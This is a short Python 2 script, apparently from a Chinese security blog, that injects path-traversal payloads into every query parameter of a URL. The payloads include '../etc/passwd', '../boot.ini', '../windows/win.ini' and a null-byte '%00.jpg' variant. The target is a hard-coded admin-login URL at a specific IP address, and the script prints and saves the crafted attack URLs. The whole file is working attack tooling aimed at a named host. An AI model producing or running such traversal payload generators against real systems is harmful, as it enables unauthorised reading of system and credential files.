#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/12/18
# Created by 独自等待
# 博客 http://www.waitalone.cn/
import urlparse, copy, urllib


def url_values_plus(url, vals):
    ret = []
    u = urlparse.urlparse(url)
    qs = u.query
    pure_url = url.replace('?'+qs, '')
    qs_dict = dict(urlparse.parse_qsl(qs))
    for val in vals:
        for k in qs_dict.keys():
            tmp_dict = copy.deepcopy(qs_dict)
            tmp_dict[k] = val
            tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict))
            ret.append(pure_url + "?" + tmp_qs)
    return ret

url = "http://27.50.129.6/index.php?a=adminlogin&c=admin"
payloads = ('../boot.ini','../etc/passwd','../windows/win.ini','../../boot.ini','../../../../../../../../../../../../../../etc/passwd%00.jpg')
urls = url_values_plus(url, payloads)
for pure_url in urls:
    fp = open("pyloadok.txt","a+")
    dataWrite = pure_url + "\r\n"
    fp.write(dataWrite)
    print pure_url
